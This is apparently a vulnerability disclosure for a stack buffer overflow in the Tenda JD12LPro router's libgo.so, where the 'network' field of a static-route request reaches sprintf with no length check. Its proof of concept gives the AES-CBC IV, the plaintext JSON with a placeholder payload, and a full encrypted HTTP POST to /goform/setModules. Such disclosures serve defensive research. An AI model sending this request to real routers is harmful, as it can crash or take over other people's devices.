# JD12LPro Vulnerability
Vendor:Tenda

Product:JD12LPro

Version: V16.03.53.10

Vulnerability: buffer overflow

Firmware Download:https://www.tenda.com.cn/material/show/619863173935173
# Descriptions
We found an overflow vulnerability in `libgo.so` :
In formstaticRouteListSet function,it reads in a user-provided parameter `network`,
<img width="910" height="226" alt="image" src="https://github.com/user-attachments/assets/3636e843-c4c5-4cc1-921e-73c9d156c265" />
The network value, obtained via the websGetJsonVarfunction, is passed to the JsonVarparameter. This JsonVarparameter is then unsafely concatenated into the sbuffer using the sprintffunction. The root cause is the complete absence of any length validation or restriction on the JsonVarinput throughout this process.​ This flaw allows an attacker to supply an arbitrarily long string for the networkfield, which sprintfwill write into the fixed-size buffer s, resulting in a stack-based buffer overflow.
<img width="1508" height="512" alt="image" src="https://github.com/user-attachments/assets/eeacfb22-1ffb-41c3-ad74-3d09687dd94d" />
As a result, by requesting the page, an attacker can easily execute a denial of service attack or remote code execution.
# Proof of Concept (PoC)
httpd dynamically links against libgo.so
The data packets are encrypted using AES in CBC mode. The encryption key and stok are extracted from the 'sign' and 'stok' fields in the login response packet, respectively.

IV：EU5H62G9ICGRNI43

<img width="2188" height="662" alt="image" src="https://github.com/user-attachments/assets/152253f6-fc13-43c7-87b5-861ce482e82d" />
Unencrypted data：

{"staticroute":[{"operateType":"add","network":"payload","mask":"255.255.255.0","gateway":"192.168.1.1","ifname":"WAN1"}]}
```
POST /;stok=cb32b71ef54db0e31f211ec82fe184a5/goform/setModules?modules=staticRouteList HTTP/1.1
Host: 192.168.1.1
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:147.0) Gecko/20100101 Firefox/147.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br
Content-Type: application/json; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 567
Origin: http://192.168.1.1
Connection: keep-alive
Referer: http://192.168.1.1/index.html?0.1857896159336854
Cookie: bLanguage=cn; _:USERNAME:_=0728272450541001ac8d78c6eb177a27
Priority: u=0

{"data":"EUQ694YGALNxgCdQ79m4PMsuBt0o4qUFfVkwEFMichQPy0fxNVUEKT59xvii9rZ09X+SFgpR75fb1qaPgGooKz8hw+ZurUsH+mJ6xJdxcLttapjJbjo/qiDwpNNhzIwdUN2+Pn8SWt7OIa05gAFqW5eHgQ2QXEX6+tgXv4Q1pLIzXnX8mtelzpvijNNOdtOgLUb2unH92QrEI5fgmAVHgFi8h9mXtjXxI501/o0/GvoO+y5zfHYsizPpNfqjzwHtHB8Gwl3kQpp/qcoa+Uw75XEhKhOcybSkcaZ6RylWGEB61/YMuoYHmk5sPO+5ElL+id9pXbaEp+KlAIB+6c/WEnt7OtiQJXbEZREwKaSDr55OudbzJ7EKn9JN/ap6fM8C6HDAoYHDgh73vxCGPh0j8iwlwJhUe2loQVg0ZN76Qt8hWQwX2yI+bJ+YJazWlNbVRHD/HtNPAD0n53yBL1QyFGhRqb5HEcKc2H8YZYmvOJDl+OrAvREC52G7TGUoHSnaQrFlClRoCGI+KxQNvE1eL9r8ksVjEydaMQcVo0bbRyo="}
```
# overcome
<img width="2690" height="996" alt="image" src="https://github.com/user-attachments/assets/1479b8a5-e3a3-409a-959c-696bd0a675ec" />


